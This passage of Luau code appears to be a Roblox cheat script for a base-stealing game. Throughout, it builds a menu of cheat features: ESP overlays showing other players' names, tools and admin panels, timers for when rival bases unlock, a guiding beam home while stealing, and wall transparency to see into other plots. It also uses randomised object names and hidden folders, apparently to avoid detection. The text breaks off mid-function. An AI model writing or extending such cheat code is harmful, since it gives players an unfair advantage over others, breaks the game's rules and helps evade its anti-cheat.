			tbl12[#tbl12 + 1] = Players.PlayerAdded:Connect(fn58)
			tbl12[#tbl12 + 1] = Players.PlayerRemoving:Connect(fn57)
			local currentCamera = Workspace.CurrentCamera

			if currentCamera then
				tbl12[#tbl12 + 1] = currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(fn61)
			end

			for _, player in ipairs(Players:GetPlayers()) do
				fn58(player)
			end

			task.spawn(function()
				while flag8 and n14 == v18 do
					task.wait(0.2)

					if flag8 and n14 == v18 then
						fn59()
					end
				end
			end)
		end

		bindableEvent.Event:Connect(fn60)
		screenGui.Destroying:Connect(fn60)

		v13:CreateToggle({
			Name = "Player ESP",
			Default = true,
			Callback = function(arg)
				if arg then
					fn63()
				else
					fn60()
				end
			end,
		})

		v13:CreateMultiDropdown({
			Name = "Show Information",
			Note = "Choose what Player ESP shows. Username replaces the display name.",
			Options = { "Name", "Username", "Avatar", "Tool", "Brainrot", "Admin Panel" },
			Default = { "Name", "Tool", "Brainrot", "Admin Panel" },
			Callback = function(arg)
				local tbl14 = {
					Name = false,
					Username = false,
					Avatar = false,
					Tool = false,
					Brainrot = false,
					["Admin Panel"] = false,
				}

				if type(arg) == "table" then
					for k, v18 in pairs(arg) do
						if type(v18) == "string" and tbl14[v18] ~= nil then
							tbl14[v18] = true
						elseif type(k) == "string" and v18 == true and tbl14[k] ~= nil then
							tbl14[k] = true
						end
					end
				end

				tbl10 = tbl14
				fn62()
			end,
		})

		v13:CreateSlider({
			Name = "ESP Size",
			Min = 50,
			Max = 200,
			Default = 100,
			AllowDecimals = false,
			Increment = 1,
			Unit = "%",
			Callback = function(arg)
				n13 = math.clamp((tonumber(arg) or 100) / 100, 0.5, 2)
				fn61()
			end,
		})
	end

	do
		local chilliBaseLockTimerRuntime, v17 = fn5("__ChilliBaseLockTimerRuntime")
		local flag9 = false
		n = 1
		local v18 = nil
		local folder = nil
		local tbl13 = {}
		local tbl14 = {}
		local color = Color3.fromRGB(255, 58, 74)
		local color2 = Color3.fromRGB(154, 255, 62)
		local colorSequence2 = ColorSequence.new
		local tbl15 = {}
		local v19 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255))
		local v20 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(222, 222, 222))
		tbl15[1] = v19
		tbl15[2] = v20

		do
			local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255)))
			table.move(values, 1, values.n, 3, tbl15)
		end

		local v21 = colorSequence2(tbl15)

		local function fn25()
			local currentCamera = Workspace.CurrentCamera
			local n15 = math.floor(math.clamp((currentCamera and currentCamera.ViewportSize.Y or 1080) * 0.064, 52, 76))
			return math.floor(n15 * 2.8), n15
		end

		local function fn26(arg)
			if not arg.Tag or not arg.Tag.Gui or not arg.Tag.Gui.Parent then
				return
			end
			local v22, v23 = fn25()
			arg.Tag.Gui.Size = UDim2.fromOffset(math.floor(v22 * n + 0.5), math.floor(v23 * n + 0.5))
		end

		local function createPart(arg)
			local v22 = fn17(arg)
			if not v22 then
				return nil
			end
			local part = Instance.new("Part")
			part.Name = fn()
			part.Size = Vector3.one
			part.Transparency = 1
			part.Anchored = true
			part.CanCollide = false
			part.CanTouch = false
			part.CanQuery = false
			part.Massless = true
			part.CastShadow = false
			part.Position = v22
			part.Parent = folder
			return part
		end

		local function fn27(arg)
			local v22 = createPart(arg)
			if not v22 then
				return nil
			end
			local billboardGui = Instance.new("BillboardGui")
			billboardGui.Name = "BaseLockTimer"
			billboardGui.Adornee = v22
			billboardGui.AlwaysOnTop = true
			billboardGui.LightInfluence = 0
			billboardGui.MaxDistance = 2500
			billboardGui.Parent = chilliBaseLockTimerRuntime
			local frame = Instance.new("Frame")
			frame.Name = "Frame"
			frame.BackgroundTransparency = 1
			frame.BorderSizePixel = 0
			frame.Size = UDim2.fromScale(1, 1)
			frame.Parent = billboardGui
			local textLabel = Instance.new("TextLabel")
			textLabel.Name = "Status"
			textLabel.BackgroundTransparency = 1
			textLabel.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
			textLabel.Position = UDim2.fromScale(0.02, 0)
			textLabel.Size = UDim2.fromScale(0.96, 0.53)
			textLabel.Text = "Open"
			textLabel.TextColor3 = color2
			textLabel.TextScaled = true
			textLabel.TextStrokeColor3 = Color3.fromRGB(8, 8, 8)
			textLabel.TextStrokeTransparency = 0
			textLabel.Parent = frame
			local uiStroke = Instance.new("UIStroke")
			uiStroke.Name = "TextOutline"
			uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
			uiStroke.Color = textLabel.TextStrokeColor3
			uiStroke.LineJoinMode = Enum.LineJoinMode.Round
			uiStroke.Thickness = 2.1
			uiStroke.Transparency = 0
			uiStroke.Parent = textLabel
			local uiGradient = Instance.new("UIGradient")
			uiGradient.Name = "Sheen"
			uiGradient.Color = v21
			uiGradient.Rotation = 90
			uiGradient.Parent = textLabel
			local textLabel2 = Instance.new("TextLabel")
			textLabel2.Name = "Timer"
			textLabel2.BackgroundTransparency = 1
			textLabel2.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
			textLabel2.Position = UDim2.fromScale(0.02, 0.43)
			textLabel2.Size = UDim2.fromScale(0.96, 0.57)
			textLabel2.Text = ""
			textLabel2.TextColor3 = Color3.fromRGB(255, 255, 255)
			textLabel2.TextScaled = true
			textLabel2.TextStrokeColor3 = Color3.fromRGB(8, 8, 8)
			textLabel2.TextStrokeTransparency = 0
			textLabel2.Visible = false
			textLabel2.Parent = frame
			local uiGradient2 = Instance.new("UIGradient")
			uiGradient2.Name = "Sheen"
			uiGradient2.Color = v21
			uiGradient2.Rotation = 90
			uiGradient2.Parent = textLabel2
			local uiStroke2 = Instance.new("UIStroke")
			uiStroke2.Name = "TextOutline"
			uiStroke2.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
			uiStroke2.Color = textLabel2.TextStrokeColor3
			uiStroke2.LineJoinMode = Enum.LineJoinMode.Round
			uiStroke2.Thickness = 2.1
			uiStroke2.Transparency = 0.05
			uiStroke2.Parent = textLabel2

			return {
				Gui = billboardGui,
				Anchor = v22,
				Status = textLabel,
				StatusStroke = uiStroke,
				Timer = textLabel2,
				TimerStroke = uiStroke2,
				StatusStyleSource = nil,
				TimerStyleSource = nil,
				StatusMode = nil,
			}
		end

		local function fn28(arg, arg2, arg3, textColor3)
			if arg3 and arg3:IsA("TextLabel") then
				arg.FontFace = arg3.FontFace
				arg.TextColor3 = arg3.TextColor3
				arg.TextStrokeColor3 = arg3.TextStrokeColor3
				arg.TextStrokeTransparency = arg3.TextStrokeTransparency
			else
				arg.TextColor3 = textColor3
			end

			arg2.Color = arg.TextStrokeColor3
			arg2.Transparency = math.clamp(arg.TextStrokeTransparency * 0.35, 0, 0.35)
		end

		local function fn29(arg)
			local str = tostring(arg or "")
			local n15 = tonumber(str:match("(%d+)%s*[mM]")) or 0
			local num = tonumber(str:match("(%d+)%s*[sS]"))

			if num == nil and n15 == 0 then
				num = tonumber(str:match("%d+")) or 0
			end

			return n15 * 60 + (num or 0)
		end

		local function fn30(arg)
			if not flag9 or not arg.Tag then
				return
			end
			local anchor = arg.Tag.Anchor
			if not anchor or not anchor.Parent then
				arg.Tag.Gui.Enabled = false
				return
			end
			local v22 = fn17(arg.Base)

			if v22 and anchor.Position ~= v22 then
				anchor.Position = v22
			end

			local v23 = nil
			local v24 = nil
			local flag10 = false
			local n15 = -1
			local v25 = nil
			local v26 = nil

			for _, timerLabel in ipairs(arg.TimerLabels) do
				if timerLabel.Parent then
					local locked = timerLabel.Parent:FindFirstChild("Locked")
					local open = timerLabel.Parent:FindFirstChild("Open") or timerLabel.Parent:FindFirstChild("Unlocked")

					if not v23 and locked and locked:IsA("TextLabel") then
						v23 = locked
					end

					if not v24 and open and open:IsA("TextLabel") then
						v24 = open
					end

					if timerLabel.Visible or locked and locked:IsA("GuiObject") and locked.Visible then
						local str = tostring(timerLabel.Text or "")
						local v27 = fn29(str)
						flag10 = true
						local flag11 = true

						if not (n15 < v27) then
							flag10 = flag11
						else
							n15 = v27
							v25 = str
							v26 = timerLabel
						end
					end
				end
			end

			arg.Tag.Gui.Enabled = not string.find(string.lower(fn16(arg.Base)), "empty base", 1, true)
			if not arg.Tag.Gui.Enabled then
				return
			end

			if flag10 then
				arg.Tag.Status.Position = UDim2.fromScale(0.02, 0)
				arg.Tag.Status.Size = UDim2.fromScale(0.96, 0.53)
				arg.Tag.Status.Text = "Locked:"
				arg.Tag.Timer.Text = v25 or ""
				arg.Tag.Timer.Visible = v25 ~= nil and v25 ~= ""

				if arg.Tag.StatusMode ~= "Locked" or arg.Tag.StatusStyleSource ~= v23 then
					arg.Tag.StatusMode = "Locked"
					arg.Tag.StatusStyleSource = v23
					fn28(arg.Tag.Status, arg.Tag.StatusStroke, v23, color)
				end

				if arg.Tag.TimerStyleSource ~= v26 then
					arg.Tag.TimerStyleSource = v26
					fn28(arg.Tag.Timer, arg.Tag.TimerStroke, v26, Color3.fromRGB(255, 255, 255))
				end
			else
				arg.Tag.Status.Position = UDim2.fromScale(0.08, 0.15)
				arg.Tag.Status.Size = UDim2.fromScale(0.84, 0.7)
				arg.Tag.Status.Text = "Open"
				arg.Tag.Timer.Text = ""
				arg.Tag.Timer.Visible = false
				v24 = v24 or v23

				if arg.Tag.StatusMode ~= "Open" or arg.Tag.StatusStyleSource ~= v24 then
					arg.Tag.StatusMode = "Open"
					arg.Tag.StatusStyleSource = v24
					fn28(arg.Tag.Status, arg.Tag.StatusStroke, v24, color2)
					arg.Tag.Status.TextColor3 = color2
				end
			end
		end

		local function fn31(arg)
			fn6(arg.TimerConnections)
			table.clear(arg.TimerLabels)
			if not arg.Base.Parent then
				return
			end

			for _, descendant in ipairs(arg.Base:GetDescendants()) do
				if descendant:IsA("TextLabel") and descendant.Name == "RemainingTime" then
					arg.TimerLabels[#arg.TimerLabels + 1] = descendant

					arg.TimerConnections[#arg.TimerConnections + 1] = descendant:GetPropertyChangedSignal("Text"):Connect(function()
						fn30(arg)
					end)

					arg.TimerConnections[#arg.TimerConnections + 1] = descendant:GetPropertyChangedSignal("Visible"):Connect(function()
						fn30(arg)
					end)

					local locked = descendant.Parent and descendant.Parent:FindFirstChild("Locked")

					if locked and locked:IsA("GuiObject") then
						arg.TimerConnections[#arg.TimerConnections + 1] = locked:GetPropertyChangedSignal("Visible"):Connect(function()
							fn30(arg)
						end)
					end
				end
			end

			fn30(arg)
		end

		local function fn32(child)
			local v22 = tbl13[child]
			if not v22 then
				return
			end
			fn6(v22.Connections)
			fn6(v22.TimerConnections)

			if v22.Tag and v22.Tag.Gui then
				v22.Tag.Gui:Destroy()
			end

			if v22.Tag and v22.Tag.Anchor then
				v22.Tag.Anchor:Destroy()
			end

			tbl13[child] = nil
		end

		local function fn33(child)
			if not flag9 or not child:IsA("Model") or tbl13[child] then
				return
			end
			local v22 = fn27(child)
			if not v22 then
				return
			end

			local tbl16 = {
				Base = child,
				Tag = v22,
				TimerLabels = {},
				Connections = {},
				TimerConnections = {},
				RefreshPending = false,
			}

			tbl13[child] = tbl16
			fn26(tbl16)

			local function fn34(descendant)
				if descendant and descendant.Name ~= "RemainingTime" and descendant.Name ~= "Locked" and not fn18(descendant) then
					return
				end

				if tbl16.RefreshPending then
					return
				end
				tbl16.RefreshPending = true

				task.defer(function()
					tbl16.RefreshPending = false

					if flag9 and tbl13[child] == tbl16 then
						fn31(tbl16)
					end
				end)
			end

			tbl16.Connections[#tbl16.Connections + 1] = child.DescendantAdded:Connect(fn34)
			tbl16.Connections[#tbl16.Connections + 1] = child.DescendantRemoving:Connect(fn34)

			tbl16.Connections[#tbl16.Connections + 1] = child.Destroying:Connect(function()
				fn32(child)
			end)

			local v23 = fn8(child)

			if v23 then
				tbl16.Connections[#tbl16.Connections + 1] = v23:GetPropertyChangedSignal("Text"):Connect(function()
					fn30(tbl16)
				end)
			end

			fn31(tbl16)
		end

		fn13 = function()
			for _, v22 in pairs(tbl13) do
				fn26(v22)
			end
		end

		fn14 = function()
			flag9 = false
			fn6(tbl14)
			local tbl16 = {}

			for k in pairs(tbl13) do
				tbl16[#tbl16 + 1] = k
			end

			for _, v22 in ipairs(tbl16) do
				fn32(v22)
			end

			if folder then
				folder:Destroy()
				folder = nil
			end

			v18 = nil
		end

		local function fn34(arg)
			v18 = arg
			tbl14[#tbl14 + 1] = arg.ChildAdded:Connect(fn33)
			tbl14[#tbl14 + 1] = arg.ChildRemoved:Connect(fn32)

			tbl14[#tbl14 + 1] = arg.DescendantAdded:Connect(function(descendant)
				if not fn18(descendant) then
					return
				end
				local parent = descendant.Parent

				if parent and parent.Parent == arg then
					fn33(parent)
				end
			end)

			for _, child in ipairs(arg:GetChildren()) do
				fn33(child)
			end
		end

		fn15 = function()
			fn14()
			flag9 = true
			folder = Instance.new("Folder")
			folder.Name = fn()
			folder.Archivable = false
			folder.Parent = Workspace
			local currentCamera = Workspace.CurrentCamera

			if currentCamera then
				tbl14[#tbl14 + 1] = currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(fn13)
			end

			tbl14[#tbl14 + 1] = Workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(fn13)
			local plots = Workspace:FindFirstChild("Plots")

			if plots then
				fn34(plots)
			else
				tbl14[#tbl14 + 1] = Workspace.ChildAdded:Connect(function(child)
					if flag9 and child.Name == "Plots" then
						fn34(child)
					end
				end)
			end
		end

		v17.Event:Connect(fn14)
		chilliBaseLockTimerRuntime.Destroying:Connect(fn14)
	end
end

local chilliBrainrotESPRuntime, v12, tbl4, flag2, tbl5, tbl6, n2, flag3, flag4, n3
local tbl7, tbl8, fn16, fn17, fn18, fn19, fn20, fn21, fn22, fn23
local attachment, v13, v14, fn24, fn25, fn26, fn27, n4, fn28, fn29

do
	local v15 = v11:CreateToggle({
		Name = "Timer ESP",
		Default = true,
		Callback = function(arg)
			if arg then
				fn15()
			else
				fn14()
			end
		end,
	})

	v11:CreateSlider({
		Name = "Timer ESP Size",
		Min = 50,
		Max = 200,
		Default = 80,
		AllowDecimals = false,
		Increment = 1,
		Unit = "%",
		Quick = false,
		SubOf = v15,
		ShowWhen = v15,
		Callback = function(arg)
			n = math.clamp((tonumber(arg) or 100) / 100, 0.5, 2)
			fn13()
		end,
	})

	local chilliYourBaseESPRuntime, v16
	chilliYourBaseESPRuntime, v16 = fn5("__ChilliYourBaseESPRuntime")
	local fillTransparency
	fillTransparency = 0.45
	local color
	color = Color3.fromRGB(255, 255, 255)
	local flag5, flag6, flag7, v17, v18, highlight, attachment2, attachment3, beam, beam2
	local tbl9, flag8, flag9, tbl10, tbl11

	do
		local tbl12 = {
			AnimalPodiums = true,
			Unlock = true,
			PlotSign = true,
			Purchases = true,
			Conveyor = true,
			Walls = true,
			Wall = true,
			Floors = true,
			Floor = true,
			Roof = true,
			Decorations = true,
			Model = true,
			Laser = true,
			LaserHitbox = true,
			InvisibleWalls = true,
			Spawn = true,
		}

		flag5 = false
		flag6 = false
		flag7 = false
		v17 = nil
		v18 = nil
		highlight = nil
		attachment2 = nil
		attachment3 = nil
		beam = nil
		beam2 = nil
		local v19 = nil
		local v20 = nil
		local n5 = 0.5
		tbl9 = { Part = nil, Base = nil, Dirty = true, NextLookup = 0 }
		flag8 = false
		flag9 = false
		local tbl13 = {}
		local n6 = 0
		local tbl14 = {}
		local obj2 = setmetatable({}, { __mode = "k" })
		tbl10 = {}
		tbl11 = {}
		local connection = nil

		local function fn30(arg, arg2)
			local v21 = obj2[arg]
			if v21 ~= nil then
				return v21
			end
			local flag10 = false

			if not tbl12[arg.Name] then
				if arg.Parent == arg2 then
					flag10 = true
				elseif arg:FindFirstChildOfClass("Humanoid") or arg:FindFirstChildOfClass("AnimationController") or arg:GetAttribute("Mutation") ~= nil then
					flag10 = true
				end
			end

			if flag10 or #arg:GetChildren() > 0 then
				obj2[arg] = flag10
			end

			return flag10
		end

		local function fn31(arg, arg2)
			if not arg:IsA("BasePart") or arg.Transparency >= 1 then
				return false
			end

			if arg.Name == "PlotSign" then
				return false
			end

			for _, child in ipairs(arg:GetChildren()) do
				if child:IsA("SurfaceGui") or child:IsA("BillboardGui") or child:IsA("Decal") or child:IsA("Texture") then
					return false
				end
			end

			while arg and arg ~= arg2 do
				if arg:IsA("Model") and fn30(arg, arg2) then
					return false
				end
				arg = arg.Parent
			end

			return arg == arg2
		end

		local function fn32(arg, arg2)
			if tbl14[arg] ~= nil or not fn31(arg, arg2) or #tbl13 == 0 then
				return
			end
			n6 += 1
			local v21 = tbl13[(n6 - 1) % #tbl13 + 1]
			local color2 = arg.Color
			tbl14[arg] = color2
			arg.Color = color2:Lerp(v21, 0.78)
		end

		local function fn33()
			for k, v21 in pairs(tbl14) do
				if k.Parent then
					pcall(function()
						k.Color = v21
					end)
				end
			end

			table.clear(tbl14)
			table.clear(obj2)
			table.clear(tbl13)
			n6 = 0
			flag9 = false
		end

		local function fn34(arg)
			fn33()
			if not arg or not arg.Parent then
				return
			end
			tbl13 = fn12("Phantom")

			for _, descendant in ipairs(arg:GetDescendants()) do
				fn32(descendant, arg)
			end

			flag9 = true
		end

		local function fn35(arg)
			for _, descendant in ipairs(arg:GetDescendants()) do
				local isTextLabel = descendant:IsA("TextLabel")

				if isTextLabel then
					isTextLabel = string.find(string.lower(tostring(descendant.Text or "")), "collect", 1, true)
				end

				if isTextLabel then
					local parent = descendant.Parent

					while parent and parent ~= arg do
						if parent:IsA("BasePart") then
							return parent
						end
						parent = parent.Parent
					end
				end
			end

			local cashPad = arg:FindFirstChild("CashPad") or arg:FindFirstChild("Cash")
			return cashPad and cashPad:FindFirstChildWhichIsA("BasePart", true) or nil
		end

		local function fn36(arg, arg2)
			while arg and arg ~= arg2 do
				local str = string.lower(arg.Name):gsub("[^%w]", "")
				local flag10 = str == "cashpad" or str == "cash" or string.find(str, "collect", 1, true)

				if not flag10 then
					flag10 = arg:IsA("TextLabel")

					if flag10 then
						flag10 = string.find(string.lower(tostring(arg.Text or "")), "collect", 1, true)
					end
				end

				if flag10 then
					return true
				end
				arg = arg.Parent
			end

			return false
		end

		local function fn37()
			if attachment2 then
				attachment2:Destroy()
			end

			if attachment3 then
				attachment3:Destroy()
			end

			attachment2 = nil
			attachment3 = nil
			beam = nil
			beam2 = nil
			v19 = nil
			v20 = nil
		end

		local function fn38(arg)
			local v21 = v18
			if not v21 then
				return nil
			end
			local part = tbl9.Part

			if tbl9.Base ~= v21 or part and not part.Parent then
				tbl9.Dirty = true
			end

			if part and part.Parent and not tbl9.Dirty then
				return part
			end

			if not tbl9.Dirty and arg < tbl9.NextLookup then
				return nil
			end
			local v22 = fn35(v21)
			tbl9.Part = v22
			tbl9.Base = v21
			tbl9.Dirty = false
			tbl9.NextLookup = arg + n5
			return v22
		end

		local function fn39(parent, parent2)
			fn37()
			attachment2 = Instance.new("Attachment")
			attachment2.Name = fn()
			attachment2.Archivable = false
			attachment2.Position = Vector3.zero
			attachment2.Parent = parent
			attachment3 = Instance.new("Attachment")
			attachment3.Name = fn()
			attachment3.Archivable = false
			attachment3.Position = Vector3.new(0, parent2.Size.Y * 0.5 + 5, 0)
			attachment3.Parent = parent2
			beam2 = Instance.new("Beam")
			beam2.Name = fn()
			beam2.Archivable = false
			beam2.Attachment0 = attachment2
			beam2.Attachment1 = attachment3
			beam2.FaceCamera = true
			beam2.Width0 = 0.38
			beam2.Width1 = 0.56
			beam2.Segments = 20
			beam2.CurveSize0 = 1.8
			beam2.CurveSize1 = -1.8
			beam2.LightEmission = 1
			beam2.Color = ColorSequence.new(Color3.fromRGB(20, 145, 255), Color3.fromRGB(90, 240, 255))
			beam2.Transparency = NumberSequence.new(0.72)
			beam = Instance.new("Beam")
			beam.Name = fn()
			beam.Archivable = false
			beam.Attachment0 = attachment2
			beam.Attachment1 = attachment3
			beam.FaceCamera = true
			beam.Width0 = 0.09
			beam.Width1 = 0.18
			beam.Segments = 20
			beam.CurveSize0 = 1.8
			beam.CurveSize1 = -1.8
			beam.LightEmission = 1
			local v21 = beam
			local colorSequence = ColorSequence.new
			local tbl15 = {}
			local v22 = ColorSequenceKeypoint.new(0, Color3.fromRGB(95, 205, 255))
			local v23 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(225, 255, 255))
			local new = ColorSequenceKeypoint.new
			local color2 = Color3.fromRGB
			tbl15[1] = v22
			tbl15[2] = v23

			do
				local values = table.pack(new(1, color2(70, 165, 255)))
				table.move(values, 1, values.n, 3, tbl15)
			end

			v21.Color = colorSequence(tbl15)
			beam.Transparency = NumberSequence.new(0.04)
			obj[beam2] = true
			obj[beam] = true
			local flag10 = v4:NextInteger(0, 1) == 0
			beam2.Parent = flag10 and attachment2 or attachment3
			beam.Parent = flag10 and attachment3 or attachment2
			v19 = parent
			v20 = parent2
		end

		local function fn40()
			if not (flag5 and flag7) then
				if attachment2 then
					fn37()
				end

				return
			end

			local flag10 = localPlayer:GetAttribute("Stealing") == true and v18 ~= nil and fn7()
			local v21 = flag10 and fn38(os.clock())

			if not (flag10 and v21) then
				if attachment2 then
					fn37()
				end
			else
				local flag11 = v19 ~= flag10 or v20 ~= v21

				if not flag11 then
					flag11 = not (attachment2 and attachment2.Parent)
				end

				if not flag11 then
					flag11 = not (attachment3 and attachment3.Parent)
				end

				if not flag11 then
					flag11 = not (beam and beam.Parent)
				end

				if not flag11 then
					flag11 = not (beam2 and beam2.Parent)
				end

				if flag11 then
					fn39(flag10, v21)
				end
			end
		end

		local function fn41()
			local flag10 = flag5 and v18 ~= nil and localPlayer:GetAttribute("Stealing") == true
			local v21 = flag10 and flag6
			flag10 = flag10 and flag7

			if v21 and not flag9 then
				fn34(v18)
			elseif not v21 and flag9 then
				fn33()
			end

			if highlight and highlight.Parent then
				highlight.Enabled = v21
			end

			fn11("UnfadedPlot", (v21 or flag10) and v18 or nil)
		end

		local function fn42()
			if connection then
				connection:Disconnect()
				connection = nil
			end

			fn37()
			fn33()

			if highlight then
				highlight:Destroy()
				highlight = nil
			end

			v18 = nil
			fn41()
		end

		local function fn43(adornee)
			v18 = adornee
			highlight = Instance.new("Highlight")
			highlight.Name = "YourBaseHighlight"
			highlight.Adornee = adornee
			highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
			highlight.FillTransparency = fillTransparency
			highlight.OutlineTransparency = 0
			highlight.Parent = chilliYourBaseESPRuntime
			local v21 = fn12("Phantom")[1] or color
			highlight.FillColor = v21
			highlight.OutlineColor = v21

			connection = adornee.DescendantAdded:Connect(function(descendant)
				if flag5 and v18 == adornee then
					if flag9 then
						fn32(descendant, adornee)
					end

					if not (tbl9.Part and tbl9.Part.Parent) and fn36(descendant, adornee) then
						tbl9.Dirty = true
					end
				end
			end)

			fn41()
		end

		local function fn44()
			if not v17 then
				return nil
			end

			for _, child in ipairs(v17:GetChildren()) do
				if child:IsA("Model") and fn9(child) then
					return child
				end
			end

			return nil
		end

		local function fn45()
			flag8 = false
			if not flag5 then
				return
			end
			local v21 = fn44()
			if v21 == v18 and highlight and highlight.Parent then
				fn41()
				return
			end
			fn42()

			if v21 then
				fn43(v21)
			end
		end

		local function fn46()
			if flag8 then
				return
			end
			flag8 = true
			task.defer(fn45)
		end

		local function fn47()
			fn6(tbl11)
			if not v17 then
				return
			end

			for _, child in ipairs(v17:GetChildren()) do
				local v21 = fn8(child)

				if v21 then
					tbl11[#tbl11 + 1] = v21:GetPropertyChangedSignal("Text"):Connect(fn46)
				end
			end
		end

		local function fn48()
			if not flag5 then
				return
			end
			fn47()
			fn46()
		end

		local function fn49(arg)
			v17 = arg

			tbl10[#tbl10 + 1] = arg.ChildAdded:Connect(function()
				task.defer(fn48)
			end)

			tbl10[#tbl10 + 1] = arg.ChildRemoved:Connect(function()
				task.defer(fn48)
			end)

			tbl10[#tbl10 + 1] = arg.DescendantAdded:Connect(function(descendant)
				if descendant:IsA("TextLabel") then
					task.defer(fn48)
				end
			end)

			fn47()
			fn45()
		end

		local function fn50()
			flag5 = false
			flag8 = false
			fn6(tbl10)
			fn6(tbl11)
			fn42()
			v17 = nil
		end

		local function fn51()
			fn50()
			flag5 = true
			tbl10[#tbl10 + 1] = RunService.RenderStepped:Connect(fn40)
			tbl10[#tbl10 + 1] = localPlayer:GetAttributeChangedSignal("Stealing"):Connect(fn41)

			tbl10[#tbl10 + 1] = localPlayer.CharacterAdded:Connect(function(character_)
				task.spawn(function()
					character_:WaitForChild("HumanoidRootPart", 5)

					if flag5 and character_ == localPlayer.Character then
						fn37()
						fn41()
					end
				end)
			end)

			local plots = Workspace:FindFirstChild("Plots")

			if plots then
				fn49(plots)
			else
				tbl10[#tbl10 + 1] = Workspace.ChildAdded:Connect(function(child)
					if flag5 and child.Name == "Plots" then
						fn49(child)
					end
				end)
			end
		end

		local function fn52()
			local v21 = flag6
			local v22

			if flag6 then
				v22 = v21
			else
				v22 = flag7
			end

			if v22 and not flag5 then
				fn51()
			elseif not v22 and flag5 then
				fn50()
			elseif v22 then
				fn41()
			end
		end

		v16.Event:Connect(fn50)
		chilliYourBaseESPRuntime.Destroying:Connect(fn50)

		v11:CreateToggle({
			Name = "Your Base ESP (While Stealing)",
			Default = false,
			Callback = function(arg)
				flag6 = arg == true
				fn52()
			end,
		})

		v11:CreateToggle({
			Name = "Beam to Your Base (While Stealing)",
			Default = true,
			Callback = function(arg)
				flag7 = arg == true
				fn52()
			end,
		})
	end

	v11:CreateSlider({
		Name = "Base Transparency",
		Min = 0,
		Max = 100,
		Default = 80,
		AllowDecimals = false,
		Increment = 1,
		Unit = "%",
		ShowWhen = v11:CreateToggle({
			Name = "Clear Base",
			Default = false,
			Callback = function(arg)
				fn11("YourBaseClear", arg == true)
			end,
		}),
		Note = "Adjusts base visibility: 0% keeps the original look and 100% makes it invisible.",
		Callback = function(arg)
			fn11("ClearBaseTransparency", math.clamp(tonumber(arg) or 80, 0, 100) / 100)
		end,
	})

	local n5
	n5 = math.clamp(tonumber(tbl3.ClearBaseTransparency) or 0.8, 0, 1)
	local n6
	n6 = 0.0015
	local folder, bindableEvent, flag10, n7, plots, connection, connection2

	do
		local tbl12 = {
			AnimalPodiums = true,
			Unlock = true,
			PlotSign = true,
			Purchases = true,
			Conveyor = true,
			Walls = true,
			Wall = true,
			Floors = true,
			Floor = true,
			Roof = true,
			Decorations = true,
		}

		local v19 = fn4()
		local tbl13 = {}

		for _, v20 in ipairs({ v19, CoreGui }) do
			if v20 and not tbl13[v20] then
				tbl13[v20] = true
				local chilliFadePlotsRuntime = v20:FindFirstChild("__ChilliFadePlotsRuntime")

				if chilliFadePlotsRuntime then
					local cleanup = chilliFadePlotsRuntime:FindFirstChild("Cleanup")

					if cleanup and cleanup:IsA("BindableEvent") then
						pcall(function()
							cleanup:Fire()
						end)
					end

					pcall(function()
						chilliFadePlotsRuntime:Destroy()
					end)
				end
			end
		end

		folder = Instance.new("Folder")
		folder.Name = "__ChilliFadePlotsRuntime"
		folder.Archivable = false
		folder.Parent = v19
		bindableEvent = Instance.new("BindableEvent")
		bindableEvent.Name = "Cleanup"
		bindableEvent.Parent = folder
		flag10 = false
		n7 = 0
		plots = nil
		connection = nil
		connection2 = nil
		local v20 = Random.new()
		local tbl14 = {}
		local n8 = 0
		local flag11 = false
		local v21 = nil
		local tbl15 = {}
		local obj2 = setmetatable({}, { __mode = "k" })

		local function fn30(arg)
			while arg do
				local parent = arg.Parent
				if parent == plots then
					return arg
				end

				if not parent or parent == Workspace then
					return nil
				end
				arg = parent
			end

			return nil
		end

		local function fn31(arg, arg2)
			local v22 = obj2[arg]
			if v22 ~= nil then
				return v22
			end
			local flag12 = false

			if not tbl12[arg.Name] then
				if arg.Parent == arg2 then
					flag12 = true
				elseif arg:FindFirstChildOfClass("Humanoid") or arg:FindFirstChildOfClass("AnimationController") then
					flag12 = true
				end
			end

			if flag12 or #arg:GetChildren() > 0 then
				obj2[arg] = flag12
			end

			return flag12
		end

		local function fn32(arg, arg2)
			while arg and arg ~= arg2 do
				if arg:IsA("Model") and fn31(arg, arg2) then
					return true
				end
				arg = arg.Parent
			end

			return false
		end

		local function fn33(arg)
			if tbl15[arg] ~= nil then
				return
			end

			if not arg:IsA("BasePart") then
				return
			end

			if arg.Transparency >= 1 then
				return
			end
			local v22 = fn30(arg)
			if not v22 or v22 == v21 or fn32(arg, v22) then
				return
			end
			local localTransparencyModifier = arg.LocalTransparencyModifier

			if math.abs(localTransparencyModifier - n5) <= 0.001 then
				localTransparencyModifier = 0
			end

			tbl15[arg] = localTransparencyModifier

			pcall(function()
				arg.LocalTransparencyModifier = math.max(localTransparencyModifier, n5)
			end)
		end

		local function fn34()
			for k, v22 in pairs(tbl15) do
				pcall(function()
					k.LocalTransparencyModifier = v22
				end)
			end

			table.clear(tbl15)
			table.clear(obj2)
			table.clear(tbl14)
			n8 = 0
			flag11 = false
		end

		local function fn35(arg)
			for k, v22 in pairs(tbl15) do
				if fn30(k) == arg then
					pcall(function()
						k.LocalTransparencyModifier = v22
					end)

					tbl15[k] = nil
				end
			end
		end

		local function fn36(arg)
			if not arg or not arg.Parent then
				return
			end

			for _, descendant in ipairs(arg:GetDescendants()) do
				fn33(descendant)
			end
		end

		local function fn37(arg)
			if v21 == arg then
				return
			end
			local v22 = v21
			v21 = arg
			if not flag10 then
				return
			end

			if arg then
				fn35(arg)
			end

			if v22 then
				fn36(v22)
			end
		end

		local function fn38(arg)
			n5 = math.clamp(tonumber(arg) or 0.8, 0, 1)
			if not flag10 then
				return
			end

			for k, v22 in pairs(tbl15) do
				if k.Parent then
					pcall(function()
						k.LocalTransparencyModifier = math.max(v22, n5)
					end)
